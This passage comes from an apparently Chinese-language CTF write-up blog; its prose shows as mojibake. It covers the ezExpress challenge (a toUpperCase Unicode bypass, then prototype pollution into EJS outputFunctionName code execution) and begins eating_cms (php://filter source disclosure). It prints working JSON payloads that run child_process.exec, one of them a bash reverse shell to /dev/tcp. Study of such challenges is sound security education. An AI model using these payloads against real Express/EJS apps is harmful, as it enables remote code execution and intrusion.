function_">use</span>(<span class="hljs-title function_">session</span>(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: <span class="hljs-title function_">randomize</span>(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span><br>&#125;))<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">logger</span>(<span class="hljs-string">&#x27;dev&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;/&#x27;</span>, indexRouter);<br><br><span class="hljs-comment">// catch 404 and forward to error handler</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>));<br>&#125;);<br><br><span class="hljs-comment">// error handler</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-comment">// set locals, only providing error in development</span><br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">message</span> = err.<span class="hljs-property">message</span>;<br>  res.<span class="hljs-property">locals</span>.<span class="hljs-property">error</span> = req.<span class="hljs-property">app</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;env&#x27;</span>) === <span class="hljs-string">&#x27;development&#x27;</span> ? err : &#123;&#125;;<br><br>  <span class="hljs-comment">// render the error page</span><br>  res.<span class="hljs-title function_">status</span>(err.<span class="hljs-property">status</span> || <span class="hljs-number">500</span>);<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = app;<br></code></pre></td></tr></table></figure><p>æ³¨æ„<code>merge</code>å’Œ<code>clone</code>ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯åŸå‹é“¾æ±¡æŸ“ã€‚</p><p>å…ˆè®¾ç½®äº†è¿™ä¹ˆä¸ªä¸œè¥¿ï¼ŒåŒ¹é…å¤§å°å†™çš„<code>admin</code>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeKeyword</span>(<span class="hljs-params">keyword</span>) &#123;<br>  <span class="hljs-keyword">if</span>(keyword.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ³¨å†Œæ—¶ä¸è®©ä½ æ³¨å†Œ<code>admin</code>ç”¨æˆ·å(å¤§å°å†™)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">Submit</span>==<span class="hljs-string">&quot;register&quot;</span>)&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_">safeKeyword</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>))&#123;<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) <br>   &#125;<br></code></pre></td></tr></table></figure><p>ä½†åé¢<code>/action</code>å’Œ<code>/info</code>è·¯ç”±é™åˆ¶åªèƒ½<code>admin</code>ç”¨æˆ·æ‰èƒ½æ“ä½œï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">if</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">user</span>!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br>&#125;)<br></code></pre></td></tr></table></figure><p><code>clone</code>å’Œ<code>merge</code>è¿™ä¸œè¥¿ç†è§£æˆæ·±æ‹·è´å°±è¡Œã€‚</p><p>ä½†æ³¨æ„è¿™ä¸ª<code>req.session.user</code>æ˜¯æ€ä¹ˆæ¥çš„ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>=&#123;<br>  <span class="hljs-string">&#x27;user&#x27;</span>:req.<span class="hljs-property">body</span>.<span class="hljs-property">userid</span>.<span class="hljs-title function_">toUpperCase</span>(),<br>  <span class="hljs-string">&#x27;passwd&#x27;</span>: req.<span class="hljs-property">body</span>.<span class="hljs-property">pwd</span>,<br>  <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>toUpperCase()</code>å‡½æ•°å¯¹<code>userid</code>è¿›è¡Œå¤§å†™å¤„ç†ã€‚å…¶å®è¿™ç§è½¬ç å¾ˆå®¹æ˜“å‡ºç°é—®é¢˜ï¼Œæ¯”å¦‚å¯¹äºæ‹‰ä¸æ–‡å­—æ¯<code>Ä±</code>ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Welcome <span class="hljs-keyword">to</span> <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Node</span>.</span></span>js v18.<span class="hljs-number">18.0</span>.<br>Type <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt; <span class="hljs-string">&quot;Ä±&quot;</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">UpperCase()</span><span class="hljs-operator"> == </span><span class="hljs-character">&#x27;I&#x27;</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>å‚è€ƒ<code>https://blog.csdn.net/qq_45691294/article/details/109320437</code></p><p>æ‰€ä»¥æ³¨å†Œä¸ª<code>admÄ±n</code>ç„¶åå°±èƒ½ä»¥<code>admin</code>èº«ä»½ç™»å½•ã€‚</p><p>ç™»å½•ä¹‹åèƒ½è¿›<code>info</code>å’Œ<code>action</code>è·¯ç”±ï¼Œæ³¨æ„<code>clone</code>å’Œ<code>render</code>å‡½æ•°ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">res.<span class="hljs-property">outputFunctionName</span>=<span class="hljs-literal">undefined</span>;<br><br>req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">data</span> = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>);<br><br>res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.<span class="hljs-property">outputFunctionName</span>&#125;);<br><br></code></pre></td></tr></table></figure><p><code>/info</code>è·¯ç”±ä¼šæ¸²æŸ“è¿™ä¸ªå¹¶ä¸å­˜åœ¨çš„<code>outputFunctionName</code>å±æ€§ï¼Œä½†å¹¶ä¸çŸ¥é“è¿™ä¸ªä¸œè¥¿å’ŒåŸå‹é“¾æ±¡æŸ“èƒ½æ‰¯ä¸Šå•¥å…³ç³»ã€‚ã€‚ç½‘ä¸Šçš„<code>payload</code>æ™®éæ˜¯è¿™ä¹ˆæ„é€ çš„ï¼Œè€Œä¸”ä¹Ÿæ²¡è¯´åŸå› (å¯èƒ½æ˜¯å¤ªç®€å•ï¼Ÿ)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span><br>  &#125;<br>&#125;<br><br>&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/9001 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åé¢ç¿»äº†ç¿»ï¼Œæ¥è‡ª<code>hardjs</code>è¿™é“é¢˜ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">......<br>      prepended += <span class="hljs-string">&#x27;  var __output = [], __append = __output.push.bind(__output);&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">outputFunctionName</span>) &#123;<br>        prepended += <span class="hljs-string">&#x27;  var &#x27;</span> + opts.<span class="hljs-property">outputFunctionName</span> + <span class="hljs-string">&#x27; = __append;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (opts.<span class="hljs-property">_with</span> !== <span class="hljs-literal">false</span>) &#123;<br>        prepended +=  <span class="hljs-string">&#x27;  with (&#x27;</span> + opts.<span class="hljs-property">localsName</span> + <span class="hljs-string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>        appended += <span class="hljs-string">&#x27;  &#125;&#x27;</span> + <span class="hljs-string">&#x27;\n&#x27;</span>;<br>      &#125;<br>......<br></code></pre></td></tr></table></figure><p>å°†<code>opts.outputFunctionName</code>æ‹¼æ¥åˆ°äº†è¯­å¥ä¸­ï¼Œè€Œä¸Šä¸‹æ–‡å¹¶æœªå‡ºç°<code>outputFunctionName</code>è¿™ä¸ªå±æ€§ï¼Œå› æ­¤é€šè¿‡æ±¡æŸ“åŸå‹é“¾æ¥åœ¨æ­¤å¤„è¿›è¡Œ<code>SSTI</code>ï¼Œæ‹¼æ¥çš„å‰é¢æœ‰ä¸€ä¸ª<code>var</code>ï¼Œè€Œåé¢æœ‰ä¸€ä¸ª<code>__append</code>ï¼Œè¿™å°±æ˜¯<code>payload</code>å‰åæ‹¼æ¥äº†å¥‡æ€ªå†…å®¹çš„åŸå› ã€‚</p><p>è®¿é—®<code>/info</code>è·¯ç”±èƒ½çœ‹åˆ°è‡ªå·±æ„é€ çš„<code>payload</code>ï¼Œä¸è¿‡è¿™é¢˜å¥½åƒä¸èƒ½å‡ºç½‘äº†ï¼Œåå¼¹shellæ²¡æ³•ç”¨ï¼š</p><p><img src="/img/ezexpresswhat.png" alt="ezexpresswhat"></p><p>å‚è€ƒ<code>https://blog.z3ratu1.top/[GYCTF2020]ezExpress.html</code>ï¼Œä¸»è¦æ˜¯å¯¹è¿™ä¸ªpayloadçš„è§£é‡Šï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;);var _tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>cat /flag &gt; /app/public/flag</code>è¿™ä¸œè¥¿æŠŠ<code>cat</code>å‘½ä»¤è¾“å‡ºçš„å†…å®¹å†™åˆ°<code>/app/public/flag</code>ä¸‹ã€‚</p><blockquote><p>è¾“å…¥ä¸å­˜åœ¨è·¯ç”±é€šè¿‡æŠ¥é”™æ‰¾åˆ°ç»å¯¹è·¯å¾„ï¼Œç„¶åæŠŠflagå†™å…¥publicé™æ€ç›®å½•ä¸‹é¢ï¼Œè®¿é—®ç›´æ¥&#x2F;flagä¸‹è½½ä¸‹æ¥</p><p>åƒpythonï¼ŒJavaScriptè¿™ç±»é€šè¿‡è·¯ç”±è®¾ç½®æœåŠ¡çš„æ–¹å¼å’ŒPHPè®¿é—®å¯¹åº”æ–‡ä»¶å°±æœ‰ä¸€å®šçš„åŒºåˆ«ï¼Œè®¾ç½®äº†è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œå°±ä¸ä¼šå‡ºç°éƒ¨åˆ†æ–‡ä»¶æš´éœ²åœ¨ç½‘ç«™æ ¹ç›®å½•è¢«è®¿é—®çš„æƒ…å†µï¼ŒåƒPHPçš„è¯å¯ä»¥ç›´æ¥æŠŠflagå†™åˆ°ç½‘ç«™æ ¹ç›®å½•é‡Œé¢å»ç›´æ¥è®¿é—®è·å¾—ï¼Œä¸è¿‡ï¼Œä»–ä»¬ä¹Ÿæœ‰å¯¹åº”çš„é™æ€ç›®å½•ï¼Œé™æ€ç›®å½•ä¸‹çš„æ–‡ä»¶å°±å¯ä»¥è¢«ç›´æ¥è®¿é—®ï¼Œæºç ä¸­app.jsè®¾ç½®äº†é™æ€ç›®å½•<code>app.use(express.static(path.join(\_\_dirname, &#39;public&#39;)));</code>è¿™ä¸ªè®¾ç½®ç›´æ¥åœ¨é™æ€ç›®å½•ä¸‹æŸ¥æ‰¾æ–‡ä»¶ï¼Œå› æ­¤è®¿é—®æ—¶æ— éœ€åœ¨urlä¸­æ·»åŠ publicç›®å½•<br>æ‰€ä»¥publicä¸‹çš„å†…å®¹å¯ä»¥è¢«ç›´æ¥è®¿é—®ï¼Œé€šè¿‡æŠŠflagå†™åˆ°é™æ€ç›®å½•ä¸‹ä¹Ÿå¯ä»¥ç›´æ¥è®¿é—®è·å¾—</p></blockquote><p>æœ€ç»ˆpayload:(æˆ‘çœ‹æœ‰äº›å¸ˆå‚…æœ€åç”¨<code>;var _tmp2</code>å»é—­åˆï¼Œæˆ‘çœ‹ä¸æ‡‚å’‹å›äº‹ç›´æ¥æ‹¿æ³¨é‡Šç¬¦æŠŠåé¢éƒ½æ³¨é‡Šæ‰äº†hh)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cat /flag &gt; /app/public/flag&#x27;)//&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p><code>register.php</code>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»å½•ï¼š</p><p>æ³¨æ„è¿™ä¸ª<code>URL</code>æŒºå¯ç–‘çš„ï¼Ÿ<code>GET</code>æ–¹å¼ç»™<code>page</code>ä¼ å‚ï¼š</p><p><img src="/img/n1ctfeatingcms1.png" alt="n1ctfeatingcms1"></p><p>ä¼ªåè®®çœ‹çœ‹èƒ½ä¸èƒ½è¯»<code>index.php</code>å’Œ<code>register.php</code>å’Œ<code>user.php</code>çš„æºç (å—çš„æˆ‘è¿™é‡Œä¸€å¼€å§‹åœ¨æ–‡ä»¶ååé¢åŠ äº†<code>.php</code>åç¼€å¯¼è‡´è¯»ä¸å‡ºæ¥)ï¼š</p><p><code>user.php?page=php://filter/convert.base64-encode/resource=info</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//user.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">filter_directory</span>();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//info.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly &quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/info.html&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//function.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    <span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span 